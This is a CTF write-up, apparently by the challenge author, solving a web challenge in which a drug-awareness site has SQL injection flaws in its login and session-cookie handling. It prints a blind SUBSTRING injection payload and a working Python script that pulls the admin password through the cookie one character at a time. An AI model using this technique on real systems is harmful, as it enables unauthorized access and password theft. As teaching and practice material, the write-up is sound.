---
categories: [ShunyaCTF]
tags: [web exploitation]     # TAG names should always be lowercase
author: Darshan
description: Web exploitation category challenge created by me for ShunyaCTF Aarambha
image:
    path: /assets/img/Banners/DrugInjection.jpg
pin: False
---

# Solution for Drug Injection Challenge

## Challenge Overview
I made a drug awareness website for my drug addict friend as a joke to help him get over his addiction. He kept complaining about not being able to log in. He scored an injection drug. I tried to convince him that he should stop getting high before he tries to log in. Injections won't always help you get higher access. He was not satisfied with just a single injection; he wanted to try a double dose. How do I convince him to stop? Help me spread awareness!

This challenge revolves around exploiting SQL injection vulnerabilities in the login page and the cookie handling mechanism to retrieve sensitive information.

## Vulnerability Explained
The application is vulnerable to SQL injection in two areas:
1. **Login Page:** The input fields for username and password are not properly sanitized, allowing malicious SQL code to be executed.
2. **Cookie Handling:** The application directly uses the cookie value in SQL queries without sanitization, enabling attackers to inject SQL commands through crafted cookies.

By leveraging these vulnerabilities, an attacker can retrieve the administrator's password, which serves as the flag for this challenge.

## Application Walkthrough
Index page of web application looks like this:
![homepage](/assets/img/ShunyaCTF/DrugInjection/homepage.png)

We see login option at the top-right of the page click that button and we are redirected to login page which looks like this:
![loginpage](/assets/img/ShunyaCTF/DrugInjection/loginpage.png)

and after successful login you will be redirected to this:
![welcomepage](/assets/img/ShunyaCTF/DrugInjection/welcomepage.png)

## Solution Script Walkthrough
To solve the challenge, we focus on exploiting the cookie handling vulnerability. Below is the breakdown of the solution script:

1. **Initialize the Session:**
   - Use the `requests` library to manage the session and send HTTP requests to the target application.

2. **Target URL:**
   - The script interacts with the `/welcome.php` endpoint of the challenge.

3. **Craft Cookie for Injection:**
   - A custom cookie is created containing the SQL injection payload.

4. **SQL Injection Payload:**
   - The payload extracts the password character by character using the `SUBSTRING` function in SQL.
   - Example payload: `' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin')='a`.

5. **Retrieve Password:**
   - Iterate through all characters in the password by testing against a predefined character set.
   - Append matching characters to the `password` variable until the full password is retrieved.

Here is the script:

```python
import requests

# Welcome page URL of the challenge
url = '<url>/welcome.php'

r = requests.Session()

cookie1 = {
    'Session': '<Your cookie value>'
}

res = r.get(url=url, cookies=cookie1)

char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}{"

sess_cookie = cookie1['Session']
print(sess_cookie)

count = 1
password = ''
while count <= 57:
    for char in char_set:
        # SQL injection payload
        payload = "' AND (SELECT SUBSTRING(password, " + str(count) + ", 1) FROM users WHERE username='admin')='" + char
        cookie = {'Session': sess_cookie + payload}
        test = r.get(url=url, cookies=cookie)

        if "Welcome, Sir!" in test.text:
            password += char
            print(f"[+] password: {password}")
            count += 1
```

## How to Use the Solution Script
1. Replace `<url>` with the challenge URL and `<Your cookie value>` with the session cookie value.
2. Run the script in a Python environment with the `requests` library installed.
3. Observe the console output to see the password being retrieved character by character.
4. Once the script completes, the full password (flag) will be displayed.

## Conclusion
This challenge highlights the critical importance of proper input validation and sanitization in web applications. By demonstrating the exploitation of SQL injection vulnerabilities, it underscores the need for secure coding practices to protect sensitive data from unauthorized access.

